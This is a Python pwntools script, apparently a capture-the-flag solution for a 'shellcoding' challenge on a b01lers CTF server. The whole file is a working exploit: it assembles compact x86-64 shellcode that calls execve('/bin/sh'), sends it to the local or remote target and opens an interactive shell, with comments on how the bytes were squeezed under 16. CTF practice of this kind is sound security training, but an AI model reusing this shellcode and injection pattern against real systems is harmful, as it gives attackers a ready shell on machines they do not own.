#!/usr/bin/env python3
from pwn import *

exe = context.binary = ELF("./shellcoding")

# Does: execve("/bin/sh", 0, 0)
# - add used because it's smaller than mov rax, 59 and we needed the space.
# - load /bin/sh off the stack
# - Simply zero out the other args and syscall
shellcode = asm("""
    add rax, 59
    lea rdi, [rbp-0x10]
    xor rsi, rsi
    xor rdx, rdx
    syscall
""")

if len(shellcode) > 16:
    raise Exception("too long, len: " + str(len(shellcode)))

if args.REMOTE:
    io = remote("chal.ctf.b01lers.com", 1007)
else:
    io = process(exe.path)

io.send(shellcode)
io.interactive()
